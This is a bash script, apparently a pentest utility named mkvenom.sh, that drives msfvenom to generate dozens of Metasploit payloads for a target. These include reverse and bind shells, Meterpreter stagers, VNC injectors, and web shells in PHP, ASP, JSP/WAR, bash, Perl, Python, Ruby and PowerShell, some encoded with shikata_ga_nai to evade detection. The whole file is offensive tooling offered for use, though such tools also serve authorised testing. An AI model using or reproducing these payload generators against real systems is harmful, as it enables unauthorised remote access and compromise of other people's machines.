#!/bin/bash
# Automatically generate various common MSF payloads for a target.
#
# Usage: mkvenom.sh <target-ip> <target-port> <local-ip> <local-port> [os]
#
# Author: phraxoid@devtty.io, https://devtty.io
# License: MIT

MKVENOM_VER="1.2"

# Wrapper for coloured program message text output:
function fancy_print() {
    local MSG="$(tput setab 0)$(tput setaf 2)$(tput bold)"
    local CLR="$(tput sgr0)"
    echo -e "\n${MSG}$1${CLR}"
}

# Parse command-line arguments:
if [[ "$#" -eq 4 ]] ; then
    TGTIP=$1
    TGTPORT=$2
    LOCIP=$3
    LOCPORT=$4
    OS="all"
elif [[ "$#" -eq 5 ]] ; then
    TGTIP=$1
    TGTPORT=$2
    LOCIP=$3
    LOCPORT=$4
    OS=$5
else
    echo "[!] Error: Incorrect number of arguments."
    echo "[-] Usage: mkvenom.sh <target-ip> <target-port> <local-ip> <local-port> [os]"
    echo "            <target-ip>   - Remote target's IP address."
    echo "            <target-port> - Remote target's port (e.g. for bind shells)."
    echo "            <local-ip>    - Local IP address (e.g. for reverse shell connections)."
    echo "            <local-port>  - Local port (e.g. a MSF multi/handler's listening port)."
    echo "            [os]          - Restrict binary payload generation to one operating system (optional)."
    echo "                            Valid values: linux, windows, osx, bsd or solaris."
    exit
fi

# Check for pre-existing output directory:
if [ -d "payloads" ] ; then
    fancy_print "[!] Directory 'payloads' already exists, exiting."
    exit
fi

# Create a work directory tree for target:
mkdir ./payloads/
if [ $? -ne 0 ] ; then
    fancy_print "[!] Unexpected result making output directory tree."
    exit
fi

# Startup:
echo "$(tput setaf 3)$(tput bold)"
echo "         __                                  __ "
echo "  __ _  / /___  _____ ___  ___  __ _    ___ / / "
echo " /  ' \/  '_/ |/ / -_) _ \/ _ \/  ' \_ (_-</ _ \\"
echo "/_/_/_/_/\_\|___/\__/_//_/\___/_/_/_(_)___/_//_/"
echo "$(tput sgr0)"
fancy_print "[#] MSF Mass Payload Generator\n[#] Version ${MKVENOM_VER}\n[#] By phraxoid@devtty.io."

fancy_print "[-] Will produce binary payloads for $OS platforms..."

# LHOST=$(ip addr | awk '/inet/ && /${IFACE}/{sub(/\/.*$/,"",$2); print $2}')
# The gist of this is to create a selection of common MSF payloads for each type of popular architecture/platform:
if [ $OS == "linux" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/linux/{x64,x86}/
    fancy_print "[-] Generating Linux 32-bit Binary Meterpreter payloads..."
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/mtr-rev-tcp-stager-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/mtr-bind-tcp-stager-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Linux 32-bit Binary Shell payloads..."
    msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/shell-rev-tcp-stager-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x86/shell-rev-tcp-inline-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/shell-bind-tcp-stager-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform linux -p linux/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Linux 64-bit Binary Shell payloads..."
    msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x64/shell-rev-tcp-stager-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/linux/x64/shell-rev-tcp-inline-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform linux -p linux/x64/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x64/shell-bind-tcp-stager-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform linux -p linux/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/linux/x64/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"
fi

if [ $OS == "windows" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/windows/{x64,x86}/
    fancy_print "[-] Generating Windows 32-bit Binary Meterpreter payloads..."
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp_allports LHOST=${LOCIP} LPORT=1 -f exe -o ./payloads/windows/x86/mtr-rev-tcp-stager-allports.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-tcp-inline-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/mtr-rev-https-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x86/mtr-rev-https-stager-shikata9-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/mtr-bind-tcp-stager-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/mtr-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 32-bit Binary Shell payloads..."
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/shell-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp_allports LHOST=${LOCIP} LPORT=1 -f exe -o ./payloads/windows/x86/shell-rev-tcp-stager-allports.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/shell-rev-tcp-inline-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x86/shell-rev-tcp-inline-shikata9-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f c -o ./payloads/windows/x86/src/shell-rev-tcp-inline-shikata9-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/shell-bind-tcp-stager-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x86/shell-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 32-bit Binary VNC payloads..."
    msfvenom -a x86 --platform windows -p windows/vncinject/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x86/vnc-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 64-bit Binary Meterpreter payloads..."
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-tcp-inline-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/mtr-rev-https-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x64/mtr-rev-https-stager-shikata9-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/mtr-bind-tcp-stager-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/mtr-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 64-bit Binary Shell payloads..."
    msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/shell-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/shell-rev-tcp-inline-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -e x86/shikata_ga_nai -i 9 -f exe -o ./payloads/windows/x64/shell-rev-tcp-inline-shikata9-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell/bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/shell-bind-tcp-stager-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform windows -p windows/x64/shell_bind_tcp LPORT=${TGTPORT} -f exe -o ./payloads/windows/x64/shell-bind-tcp-inline-p${TGTPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Windows 64-bit Binary VNC payloads..."
    msfvenom -a x64 --platform windows -p windows/x64/vncinject/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f exe -o ./payloads/windows/x64/vnc-rev-tcp-stager-p${LOCPORT}.exe 2>&1 | grep -vi "No encoder or badchars specified"
fi

if [ $OS == "bsd" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/bsd/{x64,x86}/
    fancy_print "[-] Generating FreeBSD 32-bit Binary Shell payloads..."
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x86/shell-rev-tcp-stager-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x86/shell-rev-tcp-inline-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell/bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x86/shell-bind-tcp-stager-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform bsd -p bsd/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating FreeBSD 64-bit Binary Shell payloads..."
    msfvenom -a x64 --platform bsd -p bsd/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/bsd/x64/shell-rev-tcp-inline-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform bsd -p bsd/x64/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/bsd/x64/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"
fi

if [ $OS == "osx" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/osx/{x64,x86}/
    fancy_print "[-] Generating OSX 32-bit Binary Shell payloads..."
    msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f macho -o ./payloads/osx/x86/shell-rev-tcp-inline-p${LOCPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform osx -p osx/x86/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x86/shell-bind-tcp-inline-p${TGTPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating OSX 64-bit Binary Shell payloads..."
    msfvenom -a x64 --platform osx -p osx/x64/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f macho -o ./payloads/osx/x64/shell-rev-tcp-inline-p${LOCPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x64 --platform osx -p osx/x64/shell_bind_tcp LPORT=${TGTPORT} -f macho -o ./payloads/osx/x64/shell-bind-tcp-inline-p${TGTPORT}.macho 2>&1 | grep -vi "No encoder or badchars specified"
fi

if [ $OS == "solaris" ] || [ $OS == "all" ] ; then
    mkdir -p ./payloads/solaris/{x86,sparc}/src/
    fancy_print "[-] Generating Solaris 32-bit Binary Shell payloads..."
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f elf -o ./payloads/solaris/x86/shell-rev-tcp-inline-p${LOCPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a x86 --platform solaris -p solaris/x86/shell_bind_tcp LPORT=${TGTPORT} -f elf -o ./payloads/solaris/x86/shell-bind-tcp-inline-p${TGTPORT}.elf 2>&1 | grep -vi "No encoder or badchars specified"

    fancy_print "[-] Generating Solaris SPARC C-Source Shell payloads..."
    msfvenom -a sparc --platform solaris -p solaris/sparc/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f c -o ./payloads/solaris/sparc/src/shell-rev-tcp-inline-p${LOCPORT}.c 2>&1 | grep -vi "No encoder or badchars specified" ; echo
    msfvenom -a sparc --platform solaris -p solaris/sparc/shell_bind_tcp LPORT=${TGTPORT} -f c -o ./payloads/solaris/sparc/src/shell-bind-tcp-inline-p${TGTPORT}.c 2>&1 | grep -vi "No encoder or badchars specified"
fi

fancy_print "[-] Generating PHP Meterpreter payloads..."
mkdir -p ./payloads/php/
msfvenom -a php --platform php -p php/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/mtr-rev-tcp-stager-p${LOCPORT}.php 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a php --platform php -p php/meterpreter_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/mtr-rev-tcp-inline-p${LOCPORT}.php 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a php --platform php -p php/meterpreter/bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/php/mtr-bind-tcp-stager-p${TGTPORT}.php 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating PHP Shell payloads..."
msfvenom -a php --platform php -p php/reverse_php LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/php/shell-rev-tcp-inline-p${LOCPORT}.php 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a php --platform php -p php/bind_php LPORT=${TGTPORT} -f raw -o ./payloads/php/shell-bind-tcp-inline-p${TGTPORT}.php 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating ASP Meterpreter payloads..."
mkdir -p ./payloads/asp/
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f asp -o ./payloads/asp/mtr-rev-tcp-stager-p${LOCPORT}.asp 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=${TGTPORT} -f asp -o ./payloads/asp/mtr-bind-tcp-stager-p${TGTPORT}.asp 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating ASP Shell payloads..."
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f asp -o ./payloads/asp/shell-rev-tcp-inline-p${LOCPORT}.asp 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=${TGTPORT} -f asp -o ./payloads/asp/shell-bind-tcp-inline-p${TGTPORT}.asp 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating Java JSP/WAR Shell Payloads..."
mkdir -p ./payloads/java/
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/java/shell-rev-tcp-inline-p${LOCPORT}.jsp 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -p java/jsp_shell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/java/shell-bind-tcp-inline-p${TGTPORT}.jsp 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f war -o ./payloads/java/shell-rev-tcp-inline-p${LOCPORT}.war 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -p java/jsp_shell_bind_tcp LPORT=${TGTPORT} -f war -o ./payloads/java/shell-bind-tcp-inline-p${TGTPORT}.war 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating Bash Shell payloads..."
mkdir -p ./payloads/bash/
msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/bash/shell-rev-tcp-inline-p${LOCPORT}.sh 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a cmd --platform unix -p cmd/unix/reverse_bash_telnet_ssl LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/bash/shell-rev-tcp-telnet-ssl-inline-p${LOCPORT}.sh 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating Perl Shell payloads..."
mkdir -p ./payloads/perl/
msfvenom -a cmd --platform unix -p cmd/unix/reverse_perl LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/perl/shell-rev-tcp-inline-p${LOCPORT}.pl 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a cmd --platform unix -p cmd/unix/bind_perl LPORT=${TGTPORT} -f raw -o ./payloads/perl/shell-bind-tcp-inline-p${TGTPORT}.pl 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating Python Shell & Meterpreter payloads..."
mkdir -p ./payloads/python/
msfvenom -a python --platform python -p python/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/python/shell-rev-tcp-inline-p${LOCPORT}.py 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a python --platform python -p python/meterpreter/reverse_https LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/python/mtr-rev-https-stager-p${LOCPORT}.py 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating Ruby payloads..."
mkdir -p ./payloads/ruby/
msfvenom -a ruby --platform ruby -p ruby/shell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/ruby/shell-rev-tcp-inline-p${LOCPORT}.rb 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a ruby --platform ruby -p ruby/shell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/ruby/shell-bind-tcp-inline-p${TGTPORT}.rb 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Generating PowerShell payloads..."
mkdir -p ./payloads/powershell/{x86,x64}/
msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/powershell/x86/shell-rev-tcp-inline-p${LOCPORT}.ps1 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a x86 --platform windows -p windows/powershell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/powershell/x86/shell-bind-tcp-inline-p${TGTPORT}.ps1 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a x64 --platform windows -p windows/x64/powershell_reverse_tcp LHOST=${LOCIP} LPORT=${LOCPORT} -f raw -o ./payloads/powershell/x64/shell-rev-tcp-inline-p${LOCPORT}.ps1 2>&1 | grep -vi "No encoder or badchars specified" ; echo
msfvenom -a x64 --platform windows -p windows/x64/powershell_bind_tcp LPORT=${TGTPORT} -f raw -o ./payloads/powershell/x64/shell-bind-tcp-inline-p${TGTPORT}.ps1 2>&1 | grep -vi "No encoder or badchars specified"

fancy_print "[-] Finished."
